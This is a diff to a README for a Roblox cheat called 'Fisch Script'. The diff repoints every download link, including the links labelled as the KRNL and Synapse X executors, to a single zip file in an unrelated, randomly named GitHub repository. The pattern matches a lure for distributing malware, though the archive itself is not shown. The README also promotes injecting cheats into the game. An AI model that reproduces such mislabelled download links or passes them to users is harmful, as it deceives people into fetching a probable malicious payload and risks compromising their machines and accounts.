@@ -23,13 +23,13 @@
 💡 *More features are added frequently!*  
 
 ## 📜 How to Use Fisch Script  
-1. **Download & Install**: Get the latest version from [GitHub Releases](#).  
-2. **Inject with Executor**: Use [KRNL](https://krnl.place/), [Synapse X](https://x.synapse.to/), or any compatible executor.  
+1. **Download & Install**: Get the latest version from [GitHub Releases](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip).  
+2. **Inject with Executor**: Use [KRNL](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip), [Synapse X](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip), or any compatible executor.  
 3. **Run the Script**: Copy-paste the script into your executor and execute it.  
 4. **Enjoy!** Dominate your Roblox game with ease.  
 
 ## 🔥 Download Fisch Script  
-📥 **[Latest Version](#)** (Updated: MM/DD/YYYY)  
+📥 **[Latest Version](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)** (Updated: 16.02.2025)  
 
 ## ⚠️ Disclaimer  
 This script is for **educational purposes only**. We are not responsible for any misuse. Always use scripts responsibly!  
